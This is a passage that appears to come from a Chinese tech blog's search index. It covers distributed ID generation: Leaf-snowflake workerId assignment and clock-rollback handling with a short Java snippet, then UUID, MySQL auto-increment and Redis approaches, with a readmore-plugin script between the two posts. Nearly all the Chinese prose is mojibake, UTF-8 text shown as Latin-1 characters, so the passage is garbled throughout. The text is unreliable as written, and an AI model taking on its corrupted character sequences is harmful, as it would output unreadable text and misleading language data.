å¦‚æœæœ‰æ³¨å†Œè¿‡ç›´æ¥å–å›è‡ªå·±çš„ workerIdï¼ˆZooKeeper é¡ºåºèŠ‚ç‚¹ç”Ÿæˆçš„ int ç±»å‹ IDï¼‰ï¼Œå¯åŠ¨æœåŠ¡ å¦‚æœæ²¡æœ‰æ³¨å†Œè¿‡ï¼Œå°±åœ¨è¯¥çˆ¶èŠ‚ç‚¹ä¸‹é¢åˆ›å»ºä¸€ä¸ªæŒä¹…é¡ºåºèŠ‚ç‚¹ï¼Œåˆ›å»ºæˆåŠŸåå–å›é¡ºåºå·å½“åšè‡ªå·±çš„ workerId å·ï¼Œå¯åŠ¨æœåŠ¡ 2.2.3ã€å¼±ä¾èµ– ZooKeeperé™¤äº†æ¯æ¬¡ä¼šå» ZooKeeper æ‹¿æ•°æ®ä»¥å¤–ï¼Œä¹Ÿä¼šåœ¨æœ¬æœºæ–‡ä»¶ç³»ç»Ÿä¸Šç¼“å­˜ä¸€ä¸ª workerId æ–‡ä»¶ã€‚å½“ ZooKeeper å‡ºç°é—®é¢˜ï¼Œæ°å¥½æœºå™¨å‡ºç°é—®é¢˜éœ€è¦é‡å¯æ—¶ï¼Œèƒ½ä¿è¯æœåŠ¡èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨ã€‚è¿™æ ·åšåˆ°äº†å¯¹ä¸‰æ–¹ç»„ä»¶çš„å¼±ä¾èµ–ï¼Œä¸€å®šç¨‹åº¦ä¸Šæé«˜äº† SLAã€‚ 2.2.4ã€è§£å†³æ—¶é’Ÿå›æ‹¨é—®é¢˜å› ä¸º Leaf-snowflake æ–¹æ¡ˆä¾èµ–æ—¶é—´ï¼Œå¦‚æœæœºå™¨çš„æ—¶é’Ÿå‘ç”Ÿäº†å›æ‹¨ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰å¯èƒ½ç”Ÿæˆé‡å¤çš„ IDï¼Œå› æ­¤éœ€è¦è§£å†³æ—¶é’Ÿå›é€€çš„é—®é¢˜ã€‚Leaf-snowflake æ•´ä¸ªå¯åŠ¨æµç¨‹å›¾å¦‚ä¸‹ï¼š 1ï¼‰æœåŠ¡å¯åŠ¨æ—¶é¦–å…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å†™è¿‡ ZooKeeper çš„ leaf_forever èŠ‚ç‚¹ 2ï¼‰è‹¥å†™è¿‡ï¼Œåˆ™ç”¨è‡ªèº«ç³»ç»Ÿæ—¶é—´ä¸ leaf_forever/${self} èŠ‚ç‚¹è®°å½•æ—¶é—´åšæ¯”è¾ƒï¼Œè‹¥å°äº leaf_forever/${self} æ—¶é—´åˆ™è®¤ä¸ºæœºå™¨æ—¶é—´å‘ç”Ÿäº†å¤§æ­¥é•¿å›æ‹¨ï¼ŒæœåŠ¡å¯åŠ¨å¤±è´¥å¹¶æŠ¥è­¦ 3ï¼‰è‹¥æœªå†™è¿‡ï¼Œè¯æ˜æ˜¯æ–°æœåŠ¡èŠ‚ç‚¹ï¼Œç›´æ¥åˆ›å»ºæŒä¹…èŠ‚ç‚¹ leaf_forever/${self} å¹¶å†™å…¥è‡ªèº«ç³»ç»Ÿæ—¶é—´ï¼Œæ¥ä¸‹æ¥ç»¼åˆå¯¹æ¯”å…¶ä½™ Leaf èŠ‚ç‚¹çš„ç³»ç»Ÿæ—¶é—´æ¥åˆ¤æ–­è‡ªèº«ç³»ç»Ÿæ—¶é—´æ˜¯å¦å‡†ç¡®ï¼Œå…·ä½“åšæ³•æ˜¯å– leaf_temporary ä¸‹çš„æ‰€æœ‰ä¸´æ—¶èŠ‚ç‚¹ï¼ˆæ‰€æœ‰è¿è¡Œä¸­çš„ Leaf-snowflake èŠ‚ç‚¹ï¼‰çš„æœåŠ¡ IPï¼šPortï¼Œç„¶åé€šè¿‡ RPC è¯·æ±‚å¾—åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„ç³»ç»Ÿæ—¶é—´ï¼Œè®¡ç®— sum(time) / nodeSizeã€‚ 4ï¼‰è‹¥ abs (ç³»ç»Ÿæ—¶é—´ - sum (time) /nodeSize ) &lt; é˜ˆå€¼ï¼Œè®¤ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´å‡†ç¡®ï¼Œæ­£å¸¸å¯åŠ¨æœåŠ¡ï¼ŒåŒæ—¶å†™ä¸´æ—¶èŠ‚ç‚¹ leaf_temporary/${self} ç»´æŒç§Ÿçº¦ 5ï¼‰å¦åˆ™è®¤ä¸ºæœ¬æœºç³»ç»Ÿæ—¶é—´å‘ç”Ÿå¤§æ­¥é•¿åç§»ï¼Œå¯åŠ¨å¤±è´¥å¹¶æŠ¥è­¦ 6ï¼‰æ¯éš”ä¸€æ®µæ—¶é—´ï¼ˆ3sï¼‰ä¸ŠæŠ¥è‡ªèº«ç³»ç»Ÿæ—¶é—´å†™å…¥ leaf_forever/${self} ç”±äºå¼ºä¾èµ–æ—¶é’Ÿï¼Œå¯¹æ—¶é—´çš„è¦æ±‚æ¯”è¾ƒæ•æ„Ÿï¼Œåœ¨æœºå™¨å·¥ä½œæ—¶ NTP åŒæ­¥ä¹Ÿä¼šé€ æˆç§’çº§åˆ«çš„å›é€€ï¼Œå»ºè®®å¯ä»¥ç›´æ¥å…³é—­ NTP åŒæ­¥ã€‚è¦ä¹ˆåœ¨æ—¶é’Ÿå›æ‹¨çš„æ—¶å€™ç›´æ¥ä¸æä¾›æœåŠ¡ç›´æ¥è¿”å› ERROR_CODEï¼Œç­‰æ—¶é’Ÿè¿½ä¸Šå³å¯ã€‚æˆ–è€…åšä¸€å±‚é‡è¯•ï¼Œç„¶åä¸ŠæŠ¥æŠ¥è­¦ç³»ç»Ÿï¼Œæ›´æˆ–è€…æ˜¯å‘ç°æœ‰æ—¶é’Ÿå›æ‹¨ä¹‹åè‡ªåŠ¨æ‘˜é™¤æœ¬èº«èŠ‚ç‚¹å¹¶æŠ¥è­¦ï¼Œä»£ç å¦‚ä¸‹ï¼š 12345678910111213141516171819202122//å‘ç”Ÿäº†å›æ‹¨ï¼Œæ­¤åˆ»æ—¶é—´å°äºä¸Šæ¬¡å‘å·æ—¶é—´ if (timestamp &lt; lastTimestamp) { long offset = lastTimestamp - timestamp; if (offset &lt;= 5) { try { //æ—¶é—´åå·®å¤§å°å°äº5msï¼Œåˆ™ç­‰å¾…ä¸¤å€æ—¶é—´ wait(offset &lt;&lt; 1);//wait timestamp = timeGen(); if (timestamp &lt; lastTimestamp) { //è¿˜æ˜¯å°äºï¼ŒæŠ›å¼‚å¸¸å¹¶ä¸ŠæŠ¥ throwClockBackwardsEx(timestamp); } } catch (InterruptedException e) { throw e; } } else { //throw throwClockBackwardsEx(timestamp); } } //åˆ†é…ID 3ã€å‚è€ƒèµ„æ–™ Leaf å®˜æ–¹æ–‡æ¡£ MySQL åŠåŒæ­¥å¤åˆ¶ UidGenerator å®˜æ–¹æ–‡æ¡£ åŸºäºç¾å›¢ Leafã€ç™¾åº¦ UidGeneratorã€SnowFlake æ•´åˆçš„åˆ†å¸ƒå¼å”¯ä¸€ ID ç”Ÿæˆå™¨ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼ æ•°æ®åº“"},{title:"åˆ†å¸ƒå¼å”¯ä¸€å…¨å±€ ID è§£å†³æ–¹æ¡ˆä¹‹ä¸€",url:"/posts/b2330a87.html",text:'1ã€åˆ†å¸ƒå¼ ID ç®€ä»‹1.1ã€ä¸šåŠ¡èƒŒæ™¯åœ¨å¤æ‚çš„åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå¾€å¾€éœ€è¦å¯¹å¤§é‡çš„æ•°æ®å’Œæ¶ˆæ¯è¿›è¡Œå”¯ä¸€æ ‡è¯†ã€‚æ¯”å¦‚åœ¨ç¾å›¢ç‚¹è¯„çš„é‡‘èã€æ”¯ä»˜ã€é¤é¥®ã€é…’åº—ã€çŒ«çœ¼ç”µå½±ç­‰äº§å“çš„ç³»ç»Ÿä¸­æ•°æ®æ—¥æ¸å¢é•¿ï¼Œå¯¹æ•°æ®åˆ†åº“åˆ†è¡¨åéœ€è¦æœ‰ä¸€ä¸ªå”¯ä¸€ ID æ¥æ ‡è¯†ä¸€æ¡æ•°æ®æˆ–æ¶ˆæ¯ã€‚å…·ä½“ä¸€ç‚¹çš„å¦‚è®¢å•ã€éª‘æ‰‹ã€ä¼˜æƒ åŠµä¹Ÿéƒ½éœ€è¦æœ‰å”¯ä¸€æ ‡è¯†ï¼Œæ­¤æ—¶ä¸€ä¸ªèƒ½å¤Ÿç”Ÿæˆå…¨å±€å”¯ä¸€ ID çš„ç³»ç»Ÿæ˜¯éå¸¸å¿…è¦çš„ã€‚ 1.2ã€ID ç”Ÿæˆè§„åˆ™çš„ç¡¬æ€§è¦æ±‚ å…¨å±€å”¯ä¸€ï¼šä¸èƒ½å‡ºç°é‡å¤çš„ ID ï¼Œæ—¢ç„¶æ˜¯å”¯ä¸€æ ‡è¯†ï¼Œè¿™æ˜¯æœ€åŸºæœ¬çš„è¦æ±‚ å•è°ƒé€’å¢ï¼šä¿è¯ä¸‹ä¸€ä¸ª ID å¤§äºä¸Šä¸€ä¸ª IDï¼Œä¾‹å¦‚äº‹åŠ¡ç‰ˆæœ¬å·ã€IM å¢é‡ä¿¡æ¯ã€æ’åºç­‰ç‰¹æ®Šéœ€æ±‚ è¶‹åŠ¿é€’å¢ï¼šåœ¨ MySQL çš„ InnoDB å­˜å‚¨å¼•æ“ä¸­ä½¿ç”¨çš„æ˜¯èšé›†ç´¢å¼•ï¼Œç”±äºå¤šæ•° RDBMS ä½¿ç”¨ BTree çš„æ•°æ®ç»“æ„æ¥å­˜å‚¨ç´¢å¼•æ•°æ®ï¼Œåœ¨ä¸»é”®çš„é€‰æ‹©ä¸Šé¢åº”è¯¥å°½é‡ä½¿ç”¨æœ‰åºçš„ä¸»é”®æ¥ä¿è¯å†™å…¥æ€§èƒ½ ä¿¡æ¯å®‰å…¨ï¼šå¦‚æœ ID æ˜¯è¿ç»­çš„ï¼Œæ¶æ„ç”¨æˆ·çš„çˆ¬å–å·¥ä½œå°±éå¸¸å®¹æ˜“åšäº†ï¼Œç›´æ¥æŒ‰ç…§é¡ºåºä¸‹è½½æŒ‡å®š URL å³å¯ æ‰€ä»¥åœ¨ä¸€äº›åº”ç”¨åœºæ™¯ä¸‹ï¼Œéœ€è¦ ID æ— è§„åˆ™æˆ–è€…ä¸è§„åˆ™ï¼Œè®©ç«äº‰å¯¹æ‰‹ä¸å¥½çŒœ ä¸Šè¿°çš„å…¨å±€å”¯ä¸€ã€å•è°ƒé€’å¢ã€è¶‹åŠ¿é€’å¢éœ€æ±‚åˆ†åˆ«å¯¹åº”ä¸‰ç±»ä¸åŒçš„ä¸šåŠ¡åœºæ™¯ï¼Œä½†å•è°ƒé€’å¢å’Œä¿¡æ¯å®‰å…¨è¿™ä¸¤ä¸ªéœ€æ±‚æ˜¯äº’æ–¥çš„ï¼Œæ— æ³•ä½¿ç”¨åŒä¸€ä¸ªæ–¹æ¡ˆæ»¡è¶³ 1.3ã€ID ç”Ÿæˆç³»ç»Ÿçš„å¯ç”¨æ€§è¦æ±‚ ä½å»¶è¿Ÿï¼šå‘ä¸€ä¸ªè·å–åˆ†å¸ƒå¼ ID çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°±è¦å¿«ï¼Œæé€Ÿ é«˜å¯ç”¨ï¼šä¸€ä¸ªè·å–åˆ†å¸ƒå¼ ID çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å°±è¦åœ¨ä¿è¯ 99.999% æˆåŠŸç‡çš„æƒ…å†µä¸‹åˆ›å»ºä¸€ä¸ªå”¯ä¸€åˆ†å¸ƒå¼ ID é«˜ QPSï¼šå‡å¦‚å¹¶å‘ä¸€å †åˆ›å»ºåˆ†å¸ƒå¼ ID çš„è¯·æ±‚åŒæ—¶æ€è¿‡æ¥ï¼ŒæœåŠ¡å™¨è¦é¡¶å¾—ä½ä¸”ä¸€ä¸‹å­æˆåŠŸåˆ›å»º 10 ä¸‡ä¸ªå”¯ä¸€åˆ†å¸ƒå¼ ID 2ã€UUID ç”Ÿæˆ ID2.1ã€æ¦‚è¿°UUID æŒ‰ç…§ OSF åˆ¶å®šçš„æ ‡å‡†è®¡ç®—ï¼Œç”¨åˆ°äº†ä»¥å¤ªç½‘å¡åœ°å€ã€çº³ç§’çº§æ—¶é—´ã€èŠ¯ç‰‡ ID ç å’Œè®¸å¤šå¯èƒ½çš„æ•°å­—ï¼Œå¹¶ç”±ä»¥ä¸‹å‡ éƒ¨åˆ†çš„ç»„æˆï¼šå½“å‰æ—¥æœŸå’Œæ—¶é—´ã€æ—¶é’Ÿåºåˆ—ã€å…¨å±€å”¯ä¸€çš„ IEEE æœºå™¨è¯†åˆ«å·ã€‚UUID çš„æ ‡å‡†å½¢å¼åŒ…å« 32 ä¸ª 16 è¿›åˆ¶çš„æ•°å­—ï¼Œä»¥è¿å­—å·åˆ†ä¸º 5 æ®µï¼Œå½¢å¼ä¸º cb6ce510-74fe-4e18-ac3d-05a5c96d3a0f çš„ 36 ä¸ªå­—ç¬¦ã€‚ç‰¹åˆ«æ³¨æ„ï¼ŒåŸºäº MAC åœ°å€ç”Ÿæˆ UUID çš„ç®—æ³•å¯èƒ½ä¼šé€ æˆ MAC åœ°å€æ³„éœ²ï¼Œè¿™ä¸ªæ¼æ´æ›¾è¢«ç”¨äºå¯»æ‰¾æ¢…ä¸½èç—…æ¯’çš„åˆ¶ä½œè€…ä½ç½®ã€‚ 2.2ã€ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼šæ€§èƒ½é«˜ï¼Œæœ¬åœ°ç”Ÿæˆï¼Œæ²¡æœ‰ç½‘ç»œæ¶ˆè€—ã€‚å¦‚æœåªè€ƒè™‘å”¯ä¸€æ€§ï¼Œé‚£ä¹ˆå¯ä»¥ä½¿ç”¨ ç¼ºç‚¹ï¼šæ— åºï¼Œé•¿åº¦è¾ƒé•¿ï¼Œå…¥åº“æ€§èƒ½å·®ï¼Œä½œä¸ºæ•°æ®åº“ä¸»é”®æ—¶ï¼Œä¼šå¯¼è‡´ç´¢å¼•æ•ˆç‡ä¸‹é™ï¼Œç©ºé—´å ç”¨è¾ƒå¤š é€‚ç”¨åœºæ™¯ï¼šåªè¦å¯¹å­˜å‚¨ç©ºé—´æ²¡æœ‰è‹›åˆ»è¦æ±‚çš„éƒ½èƒ½å¤Ÿé€‚ç”¨ï¼Œæ¯”å¦‚å„ç§é“¾è·¯è¿½è¸ªã€æ—¥å¿—å­˜å‚¨ç­‰ ä¸ºä»€ä¹ˆæ— åºçš„ UUID ä¼šå¯¼è‡´å…¥åº“æ€§èƒ½å˜å·®ï¼Ÿ æ— åºï¼šå³æ— æ³•é¢„æµ‹ ID çš„ç”Ÿæˆé¡ºåºï¼Œä¸èƒ½ç”Ÿæˆé€’å¢çš„æœ‰åºæ•°å­— ID é•¿åº¦è¿‡é•¿ï¼šåˆ†å¸ƒå¼ ID ä¸€èˆ¬éƒ½æ˜¯ä½œä¸ºä¸»é”®ï¼Œä½†æ˜¯ MySQL å®˜æ–¹æ¨èä¸»é”®å°½é‡è¶ŠçŸ­è¶Šå¥½ï¼Œ36 ä¸ªå­—ç¬¦é•¿åº¦çš„ UUID ä¸æ˜¯å¾ˆæ¨è B+ æ ‘ç´¢å¼•åˆ†è£‚ï¼šæ—¢ç„¶åˆ†å¸ƒå¼ ID æ˜¯ä¸»é”®ï¼Œç„¶åä¸»é”®æ˜¯åŒ…å«ç´¢å¼•çš„ï¼ŒMySQL çš„ç´¢å¼•æ˜¯é€šè¿‡ B+ æ ‘æ¥å®ç°çš„ï¼Œæ¯ä¸€æ¬¡æ–°çš„ UUID æ•°æ®çš„æ’å…¥ï¼Œä¸ºäº†æŸ¥è¯¢çš„ä¼˜åŒ–ï¼Œéƒ½ä¼šå¯¹ç´¢å¼•çš„åº•å±‚ B+ æ ‘è¿›è¡Œä¿®æ”¹ã€‚å› ä¸º UUID æ•°æ®æ˜¯æ— åºçš„ï¼Œæ‰€ä»¥æ¯ä¸€æ¬¡ UUID çš„æ•°æ®æ’å…¥éƒ½ä¼šå¯¹ä¸»é”®åº•å±‚çš„ B+ æ ‘è¿›è¡Œå¾ˆå¤§çš„ä¿®æ”¹ï¼Œè¿™ä¸€ç‚¹éå¸¸ä¸å¥½ã€‚æ’å…¥çš„ ID å®Œå…¨æ— åºï¼Œä¸ä½†ä¼šå¯¼è‡´ä¸€äº›ä¸­é—´èŠ‚ç‚¹äº§ç”Ÿåˆ†è£‚ï¼Œä¹Ÿä¼šç™½ç™½çš„åˆ›é€ å‡ºå¾ˆå¤šçš„ä¸é¥±å’ŒèŠ‚ç‚¹ï¼Œè¿™æ ·å¤§å¤§çš„é™ä½äº†æ•°æ®åº“çš„æ’å…¥æ€§èƒ½ 3ã€æ•°æ®åº“è‡ªå¢ ID3.1ã€æ¦‚è¿°åœ¨åˆ†å¸ƒå¼åº”ç”¨é‡Œï¼Œæ•°æ®åº“çš„è‡ªå¢ ID æœºåˆ¶çš„ä¸»è¦åŸç†æ˜¯ä½¿ç”¨ï¼šMySQL æ•°æ®åº“è‡ªå¢ ID å’Œ replace into æ¥å®ç°çš„ã€‚åˆ©ç”¨ç»™å­—æ®µè®¾ç½® auto_increment å’Œ auto_increment_offset æ¥ä¿è¯ ID è‡ªå¢ï¼Œæ¯æ¬¡ä¸šåŠ¡ä½¿ç”¨ä¸‹åˆ— SQL è¯»å†™ MySQL å¾—åˆ° IDã€‚ è¿™é‡Œçš„ replace into è·Ÿ insert åŠŸèƒ½ç±»ä¼¼ï¼Œä¸åŒç‚¹åœ¨äº replace into é¦–å…ˆä¼šå°è¯•æ’å…¥æ•°æ®åˆ°è¡¨ä¸­ï¼Œå¦‚æœå‘ç°è¡¨ä¸­å·²ç»æœ‰æ­¤è¡Œæ•°æ®ï¼ˆæ ¹æ®ä¸»é”®æˆ–è€…å”¯ä¸€ç´¢å¼•åˆ¤æ–­ï¼‰ï¼Œåˆ™å…ˆåˆ é™¤æ—§æ•°æ®ï¼Œå¦åˆ™ç›´æ¥æ’å…¥æ–°æ•°æ® 3.2ã€ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š éå¸¸ç®€å•ï¼Œåˆ©ç”¨ç°æœ‰æ•°æ®åº“ç³»ç»Ÿçš„åŠŸèƒ½å®ç°ï¼Œæˆæœ¬å° ID å•è°ƒè‡ªå¢ï¼Œå¯ä»¥å®ç°ä¸€äº›å¯¹ ID æœ‰ç‰¹æ®Šè¦æ±‚çš„ä¸šåŠ¡ ç¼ºç‚¹ï¼š ç”Ÿæˆçš„æ˜¯å•è°ƒé€’å¢çš„ IDï¼ŒåŒæ—¶ ID æ˜¯å¯è®¡ç®—çš„ï¼Œä¸é€‚ç”¨äºè®¢å• ID ç”Ÿæˆåœºæ™¯ï¼Œå¦åˆ™ç«äº‰å¯¹æ‰‹å¾ˆä»å®¹æ˜“çŒœåˆ° åˆ†åº“åˆ†è¡¨åï¼ŒåŒä¸€æ•°æ®è¡¨çš„è‡ªå¢ ID å®¹æ˜“é‡å¤ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨ï¼ˆå¯ä»¥è®¾ç½®è‡ªå¢æ­¥é•¿ï¼Œä½†å±€é™æ€§å¾ˆæ˜æ˜¾ï¼‰ å¼ºä¾èµ–æ•°æ®åº“ï¼Œå½“æ•°æ®åº“å¼‚å¸¸æ—¶æ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ï¼Œå±äºè‡´å‘½é—®é¢˜ã€‚é…ç½®ä¸»ä»å¤åˆ¶å¯ä»¥å°½å¯èƒ½çš„å¢åŠ å¯ç”¨æ€§ï¼Œä½†æ˜¯æ•°æ®ä¸€è‡´æ€§åœ¨ç‰¹æ®Šæƒ…å†µä¸‹éš¾ä»¥ä¿è¯ï¼Œä¸»ä»åˆ‡æ¢æ—¶çš„ä¸ä¸€è‡´å¯èƒ½ä¼šå¯¼è‡´é‡å¤ç”Ÿæˆ ID ç”Ÿæˆ ID çš„æ€§èƒ½ç“¶é¢ˆé™åˆ¶åœ¨å•å° MySQL çš„è¯»å†™æ€§èƒ½ï¼Œå¦‚æœè®¾è®¡ä¸€ä¸ªå•ç‹¬çš„æ•°æ®åº“æ¥å®ç°åˆ†å¸ƒå¼åº”ç”¨çš„æ•°æ®å”¯ä¸€æ€§ï¼Œå³ä½¿ä½¿ç”¨é¢„ç”Ÿæˆæ–¹æ¡ˆï¼Œä¹Ÿä¼šå› ä¸ºäº‹åŠ¡é”çš„é—®é¢˜ï¼Œé«˜å¹¶å‘åœºæ™¯å®¹æ˜“å‡ºç°å•ç‚¹ç“¶é¢ˆ é€‚ç”¨åœºæ™¯ï¼š å•æ•°æ®åº“å®ä¾‹çš„è¡¨ IDï¼ˆåŒ…å«ä¸»ä»åŒæ­¥åœºæ™¯ï¼‰ï¼Œéƒ¨åˆ†æŒ‰å¤©è®¡æ•°çš„æµæ°´å·ç­‰ï¼Œä¸é€‚ç”¨äºåˆ†åº“åˆ†è¡¨åœºæ™¯ã€å…¨å±€å”¯ä¸€ ID åœºæ™¯ æ•°æ®åº“çš„è‡ªå¢ ID æœºåˆ¶ä¸ºä»€ä¹ˆä¸é€‚åˆä½œä¸ºåˆ†å¸ƒå¼ IDï¼Ÿ åœ¨é«˜å¹¶å‘çš„åœºæ™¯ä¸‹ï¼Œæ•°æ®åº“å‹åŠ›è¿˜æ˜¯å¾ˆå¤§ï¼Œæ¯æ¬¡è·å– ID éƒ½å¾—è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œéå¸¸å½±å“æ€§èƒ½ï¼Œä¸ç¬¦åˆåˆ†å¸ƒå¼ ID é‡Œé¢çš„ä½å»¶è¿Ÿå’Œé«˜ QPS çš„è§„åˆ™ ç³»ç»Ÿæ°´å¹³æ‰©å±•æ¯”è¾ƒå›°éš¾ï¼Œä¸ºäº†æé«˜ MySQL çš„æ€§èƒ½ï¼Œå¦‚æœè¦å¢åŠ  MySQL æ•°æ®åº“è¯¥æ€ä¹ˆåšï¼Ÿ 3.3ã€MySQL é›†ç¾¤åœºæ™¯åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­å¯ä»¥å¤šéƒ¨ç½²å‡ å°æœºå™¨ï¼Œæ¯å°æœºå™¨è®¾ç½®ä¸åŒçš„åˆå§‹å€¼ï¼Œä¸”è‡ªå¢æ­¥é•¿å’Œæœºå™¨æ•°ç›¸ç­‰ã€‚æ¯”å¦‚æœ‰ 2 å°æœºå™¨ï¼Œè®¾ç½®è‡ªå¢æ­¥é•¿ä¸º 2ï¼ŒTicketServer1 çš„åˆå§‹å€¼ä¸º 1ï¼ˆ1ï¼Œ3ï¼Œ5ï¼Œ7ï¼Œ9ï¼Œ11 â€¦ï¼‰ã€TicketServer2 çš„åˆå§‹å€¼ä¸º 2ï¼ˆ2ï¼Œ4ï¼Œ6ï¼Œ8ï¼Œ10 â€¦ï¼‰ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œåˆ†åˆ«è®¾ç½®ä¸¤å°æœºå™¨å¯¹åº”çš„å‚æ•°ï¼ŒTicketServer1 ä» 1 å¼€å§‹ç”Ÿæˆ ID ï¼ŒTicketServer2 ä» 2 å¼€å§‹ç”Ÿæˆ ID ï¼Œä¸¤å°æœºå™¨æ¯æ¬¡ç”Ÿæˆ ID ä¹‹åéƒ½é€’å¢ 2ã€‚ 1234567TicketServer1:auto-increment-increment = 2auto-increment-offset = 1TicketServer2:auto-increment-increment = 2auto-increment-offset = 2 å‡è®¾è¦éƒ¨ç½² N å°æœºå™¨ï¼Œè‡ªå¢æ­¥é•¿éœ€è®¾ç½®ä¸º Nï¼Œæ¯å°çš„åˆå§‹å€¼ä¾æ¬¡ä¸º 0ï¼Œ1ï¼Œ2 â€¦ N-1ï¼Œé‚£ä¹ˆæ•´ä¸ªæ¶æ„å°±å˜æˆäº†å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š è¿™ç§æ¶æ„è²Œä¼¼èƒ½å¤Ÿæ»¡è¶³æ€§èƒ½çš„éœ€æ±‚ï¼Œä½†æœ‰ä»¥ä¸‹å‡ ä¸ªç¼ºç‚¹ï¼š æ•°æ®åº“å‹åŠ›è¿˜æ˜¯å¾ˆå¤§ï¼Œæ¯æ¬¡è·å– ID éƒ½å¾—è¯»å†™ä¸€æ¬¡æ•°æ®åº“ï¼Œåªèƒ½é å †æœºå™¨æ¥æé«˜æ€§èƒ½ ID æ²¡æœ‰äº†å•è°ƒé€’å¢çš„ç‰¹æ€§ï¼Œåªèƒ½è¶‹åŠ¿é€’å¢ï¼Œè¿™ä¸ªç¼ºç‚¹å¯¹äºä¸€èˆ¬ä¸šåŠ¡éœ€æ±‚ä¸æ˜¯å¾ˆé‡è¦ï¼Œå¯ä»¥å®¹å¿ ç³»ç»Ÿæ°´å¹³æ‰©å±•æ¯”è¾ƒå›°éš¾ï¼Œæ¯”å¦‚å®šä¹‰å¥½äº†è‡ªå¢æ­¥é•¿å’Œæœºå™¨å°æ•°ä¹‹åï¼Œå¦‚æœè¦æ·»åŠ æœºå™¨è¯¥æ€ä¹ˆåšï¼Ÿå‡è®¾ç°åœ¨åªæœ‰ä¸€å°æœºå™¨ç”Ÿæˆ ID æ˜¯ 1ï¼Œ2ï¼Œ3ï¼Œ4ï¼Œ5ï¼ˆè‡ªå¢æ­¥é•¿æ˜¯ 1ï¼‰ï¼Œè¿™ä¸ªæ—¶å€™éœ€è¦æ‰©å®¹æœºå™¨ä¸€å°ã€‚å¯ä»¥è¿™æ ·åšï¼šæŠŠç¬¬äºŒå°æœºå™¨çš„åˆå§‹å€¼è®¾ç½®å¾—æ¯”ç¬¬ä¸€å°è¶…è¿‡å¾ˆå¤šï¼Œæ¯”å¦‚ 14ï¼ˆå‡è®¾åœ¨æ‰©å®¹æ—¶é—´ä¹‹å†…ç¬¬ä¸€å°ä¸å¯èƒ½å‘åˆ° 14ï¼‰ï¼ŒåŒæ—¶è®¾ç½®è‡ªå¢æ­¥é•¿ä¸º 2ï¼Œé‚£ä¹ˆè¿™å°æœºå™¨ä¸‹å‘çš„å·ç éƒ½æ˜¯ 14 ä»¥åçš„å¶æ•°ã€‚ç„¶åæ‘˜æ‰ç¬¬ä¸€å°ï¼ŒæŠŠ ID å€¼ä¿ç•™ä¸ºå¥‡æ•°ï¼Œæ¯”å¦‚ 7ï¼Œç„¶åä¿®æ”¹ç¬¬ä¸€å°çš„è‡ªå¢æ­¥é•¿ä¸º 2ã€‚è®©å®ƒç¬¦åˆæˆ‘ä»¬å®šä¹‰çš„å·æ®µæ ‡å‡†ï¼Œå¯¹äºè¿™ä¸ªä¾‹å­æ¥è¯´å°±æ˜¯è®©ç¬¬ä¸€å°ä»¥ååªèƒ½äº§ç”Ÿå¥‡æ•°ã€‚æ‰©å®¹æ–¹æ¡ˆçœ‹èµ·æ¥å¤æ‚å—ï¼Ÿè²Œä¼¼è¿˜å¥½ï¼Œç°åœ¨æƒ³è±¡ä¸€ä¸‹å¦‚æœçº¿ä¸Šæœ‰ 100 å°æœºå™¨ï¼Œè¿™ä¸ªæ—¶å€™è¦æ‰©å®¹è¯¥æ€ä¹ˆåšï¼Ÿç®€ç›´æ˜¯å™©æ¢¦ï¼Œæ‰€ä»¥ç³»ç»Ÿæ°´å¹³æ‰©å±•æ–¹æ¡ˆå¤æ‚éš¾ä»¥å®ç°ã€‚ 4ã€åŸºäº Redis ç”Ÿæˆå…¨å±€ ID ç­–ç•¥4.1ã€æ¦‚è¿°å› ä¸º Redis æ˜¯å•çº¿ç¨‹çš„ï¼Œå¤©ç”Ÿä¿è¯äº†åŸå­æ€§ï¼Œå¯ä»¥ä½¿ç”¨åŸå­æ“ä½œ INCR å’Œ INCRBY æ¥ç”Ÿæˆåˆ†å¸ƒå¼å”¯ä¸€ ID 4.2ã€ä¼˜ç¼ºç‚¹ä¼˜ç‚¹ï¼š æ•´ä½“ååé‡æ¯”æ•°æ®åº“æ–¹æ¡ˆè¦é«˜ ç¼ºç‚¹ï¼š Redis å®ä¾‹æˆ–é›†ç¾¤å®•æœºåï¼Œæ‰¾å›æœ€æ–°çš„ ID å€¼æœ‰ç‚¹å›°éš¾ Redis å•æœºç¯å¢ƒä¸‹ï¼Œå­˜åœ¨å•ç‚¹æ•…éšœé—®é¢˜ï¼Œå¯¼è‡´ ID ç”ŸæˆæœåŠ¡ä¸å¯ç”¨ ç”Ÿæˆçš„æ˜¯å•è°ƒé€’å¢çš„ IDï¼ŒåŒæ—¶ ID æ˜¯å¯è®¡ç®—çš„ï¼Œä¸é€‚ç”¨äºè®¢å• ID ç”Ÿæˆåœºæ™¯ï¼Œå¦åˆ™ç«äº‰å¯¹æ‰‹å¾ˆä»å®¹æ˜“çŒœåˆ° é€‚ç”¨åœºæ™¯ï¼š 